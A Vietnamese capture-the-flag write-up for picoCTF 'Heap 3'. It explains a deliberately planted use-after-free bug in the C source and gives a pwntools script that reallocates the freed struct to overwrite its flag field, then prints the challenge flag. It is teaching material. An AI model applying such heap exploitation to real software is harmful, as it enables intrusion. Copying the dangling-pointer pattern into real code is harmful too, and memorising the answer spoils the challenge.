# Heap 3
Tương tự như các challenge `Heap` trước đó, challenge này cho ta 2 file. Một file binary `chall` và một file .c `chall.c`.

Mở file `chall.c` và ta có source code của challenge này như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

Chương trình vẫn hoạt động theo các lựa chọn như các challenge `heap` trước đó, nhưng lần này có gì đó khác khác...

Chạy thử local thì ta có giao diện sau:

![image](https://github.com/user-attachments/assets/7dafc717-cae7-4934-8485-be8591873c1f)

Nhìn sơ qua code thì ta thấy một dòng gây ra lỗi trong hàm `free_memory()`:

``` c
void free_memory() {
    free(x);
}
```

Đây là dấu hiệu của chương trình mắc phải lỗi bảo mật kiểu [Use - After - Free](https://www.techtimes.vn/lo-hong-su-dung-sau-khi-mien-phi-uaf-la-gi/), sau khi thực hiện lệnh `free(x)` thì con trỏ `x` vẫn còn.

Giờ ta nhìn vào hàm `check_win()`, ta thấy rằng flag sẽ được in khi giá trị của trường `flag` trong struct mà `x` là con trỏ trỏ tới bằng với chuỗi `pico`.

``` c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}
```

Ta sẽ khai thác lỗ hổng `Use - After - Free` để làm điều đó.

Đầu tiên chọn `5. Free x`.
Sau đó chọn `2. Allocate object`. Size là 35 (trường flag nằm ở 5 btyes cuối trong struct `object`). Ta nhập 30 kí tự 'a' và chuỗi `pico`.

Ta có file exploit:

``` python 
from pwn import *

#p = process('./chall')
p = remote('tethys.picoctf.net', 52463)
write = b'2'
Size = b'35'
flag = b'4'
free = b'5'
payload = 30 * b'a'
payload += b'pico' 
p.sendline(free) # 5. Free x
p.sendline(write) # 2. Allocate object
p.sendline(Size) # Size = 35
p.sendline(payload) 
p.sendline(flag)
p.interactive()
```

Và ta có flag:
``` 
picoCTF{now_thats_free_real_estate_f8fb9f96}
```
